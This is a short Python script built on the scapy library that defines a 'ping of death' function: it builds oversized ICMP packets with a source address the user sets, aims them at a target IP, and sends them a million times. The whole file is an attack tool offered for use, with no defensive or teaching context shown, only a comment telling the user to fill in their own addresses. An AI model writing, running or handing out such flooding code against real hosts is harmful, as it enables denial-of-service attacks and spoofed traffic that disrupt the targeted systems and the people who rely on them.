from scapy.all import *
def pod(ip):
	# Change according with your IP addresses
	SOURCE_IP="10.0.0.3"
	TARGET_IP=ip
	MESSAGE="T"
	NUMBER_PACKETS=1000000 # Number of pings

	pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*6000)
	send(NUMBER_PACKETS*pingOFDeath)
